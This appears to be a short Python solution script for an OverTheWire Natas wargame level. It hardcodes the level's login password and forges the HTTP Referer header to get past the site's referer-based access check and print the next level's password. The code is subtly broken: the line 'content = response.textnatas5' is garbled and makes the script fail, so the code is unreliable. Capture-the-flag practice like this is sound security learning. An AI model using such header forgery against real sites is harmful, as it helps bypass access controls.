#!/usr/bin/env python3

import requests, re

match = "natas"
username = "natas4"
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

#url = "http://%s.natas.labs.overthewire.org/robots.txt" % username
url = "http://%s.natas.labs.overthewire.org/" % username

response = requests.get(url, auth= (username, password), headers={'referer': "http://natas5.natas.labs.overthewire.org/"})
content = response.textnatas5
print(content)
#print(re.findall(f'<!--The password for {match}. is (.*) -->', content)[0])